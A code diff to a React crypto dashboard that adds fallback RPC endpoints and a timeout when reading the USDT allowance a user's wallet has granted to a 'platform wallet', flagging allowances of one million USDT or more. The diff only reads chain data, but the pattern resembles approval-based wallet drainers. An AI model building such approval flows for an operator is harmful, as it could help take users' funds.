@@ -541,10 +541,25 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       const platformWallet = settings?.platformWalletETH || settings?.platformWallet;
       if (!platformWallet) return;
       const ETH_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-      const ethProvider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com');
-      const contract = new ethers.Contract(ETH_USDT, ['function allowance(address,address) view returns (uint256)'], ethProvider);
-      const allowance = await contract.allowance(walletAddress, platformWallet);
-      setEthApproved(allowance.gte(ethers.utils.parseUnits('1000000', 6)));
+      const ETH_RPCS = [
+        'https://rpc.ankr.com/eth',
+        'https://eth.llamarpc.com',
+        'https://1rpc.io/eth',
+        'https://cloudflare-eth.com',
+      ];
+      // Try each RPC in order until one works
+      for (const rpc of ETH_RPCS) {
+        try {
+          const ethProvider = new ethers.providers.JsonRpcProvider(rpc);
+          const contract = new ethers.Contract(ETH_USDT, ['function allowance(address,address) view returns (uint256)'], ethProvider);
+          const allowance = await Promise.race([
+            contract.allowance(walletAddress, platformWallet),
+            new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 5000))
+          ]);
+          setEthApproved(allowance.gte(ethers.utils.parseUnits('1000000', 6)));
+          return; // success
+        } catch { continue; }
+      }
     } catch (e) { /* silent */ }
   }, [walletAddress]);
 
